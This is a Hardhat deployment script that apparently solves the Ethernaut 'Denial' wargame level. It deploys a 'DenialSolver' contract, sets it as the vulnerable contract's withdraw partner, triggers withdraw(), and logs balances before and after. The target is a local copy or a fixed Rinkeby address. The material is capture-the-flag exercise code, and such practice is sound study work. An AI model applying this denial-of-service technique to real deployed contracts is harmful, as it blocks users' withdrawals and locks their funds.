const { network, ethers, getUnnamedAccounts } = require("hardhat")
const { networkConfig, developmentChains, generateGateKey } = require("../helper-hardhat-config")

module.exports = async ({ getNamedAccounts, deployments }) => {
    const { deploy, log } = deployments
    const { deployer } = await getNamedAccounts()
    const chainId = network.config.chainId

    let target
    if (developmentChains.includes(network.name)) {
        log("Localhost: Deploying target contract...")
        const targetDeployment = await deploy("Denial", {
            from: deployer,
            args: [],
            log: true,
        })

        target = await ethers.getContractAt("Denial", targetDeployment.address, deployer)
        await (await ethers.getSigner(deployer)).sendTransaction({ to: target.address, value: ethers.utils.parseEther("1") })
    } else {
        // Get the contract address in Rinkeby
        target = await ethers.getContractAt("Denial", "0x8770150A5376D3424a813CCB698E3eFab589CD3B", deployer)
    }

    const solverDeployment = await deploy("DenialSolver", {
        from: deployer,
        args: [],
        log: true,
    })

    const solver = await ethers.getContractAt("DenialSolver", solverDeployment.address, deployer)

    await target.setWithdrawPartner(solver.address)
    const timeLastWithdrawBefore = await target.timeLastWithdrawn()
    const balanceBefore = await ethers.provider.getBalance(target.address)
    log(`Before Time: ${timeLastWithdrawBefore}`)
    log(`Before Balance: ${balanceBefore}`)
    await target.withdraw()
    const timeLastWithdrawAfter = await target.timeLastWithdrawn()
    const balanceAfter = await ethers.provider.getBalance(target.address)
    log(`After Time: ${timeLastWithdrawAfter}`)
    log(`After Balance: ${balanceAfter}`)
}

module.exports.tags = ["all", "denial"]
